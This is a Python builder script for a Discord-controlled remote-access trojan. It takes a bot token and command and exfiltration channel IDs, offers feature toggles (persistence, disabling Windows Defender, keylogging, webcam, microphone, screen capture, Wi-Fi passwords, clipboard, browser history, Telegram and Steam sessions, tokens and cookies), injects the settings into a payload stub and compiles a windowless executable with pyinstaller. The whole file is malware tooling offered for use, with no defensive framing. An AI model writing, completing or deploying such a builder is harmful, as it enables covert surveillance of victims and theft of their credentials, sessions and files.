import json, subprocess, os

print("discord c2 builder (command line)")
bottoken = input("bot token: ")
commandchan = input("command channel id: ")
exfilchan = input("exfil channel id: ")
pollinterval = input("poll interval (seconds) [30]: ") or "30"
fileexts = input("file extensions [.txt,.doc,.pdf]: ") or ".txt,.doc,.pdf"
maxsize = input("max file size MB [10]: ") or "10"
recordsec = input("record seconds [30]: ") or "30"

print("\nfeatures (y/n):")
persist = input("persistence? (y/n): ").lower() == "y"
defender = input("disable defender? (y/n): ").lower() == "y"
keylog = input("keylogger? (y/n): ").lower() == "y"
webcam = input("webcam? (y/n): ").lower() == "y"
screenshot = input("screenshot? (y/n): ").lower() == "y"
screenrec = input("screen recording? (y/n): ").lower() == "y"
mic = input("microphone? (y/n): ").lower() == "y"
filesearch = input("file search? (y/n): ").lower() == "y"
wifi = input("wifi passwords? (y/n): ").lower() == "y"
clip = input("clipboard? (y/n): ").lower() == "y"
history = input("browser history? (y/n): ").lower() == "y"
telegram = input("telegram sessions? (y/n): ").lower() == "y"
steam = input("steam login? (y/n): ").lower() == "y"
tokens = input("tokens + cookies + roblox? (y/n): ").lower() == "y"

config = {
    "bottoken": bottoken,
    "commandchan": int(commandchan),
    "exfilchan": int(exfilchan),
    "pollinterval": int(pollinterval),
    "persist": persist,
    "disabledefender": defender,
    "keylog": keylog,
    "webcam": webcam,
    "screenshot": screenshot,
    "screenrec": screenrec,
    "mic": mic,
    "filesearch": filesearch,
    "wifi": wifi,
    "clipboard": clip,
    "history": history,
    "telegram": telegram,
    "steam": steam,
    "tokens": tokens,
    "fileexts": fileexts,
    "maxfilesizemb": int(maxsize),
    "recordseconds": int(recordsec)
}

with open("payloadstub.py", "r") as f:
    stub = f.read()
stub = f"config = {json.dumps(config, indent=4)}\n\n" + stub
with open("payload_compiled.py", "w") as f:
    f.write(stub)
subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload_compiled.py"])
print("done. payload.exe is in the dist folder")
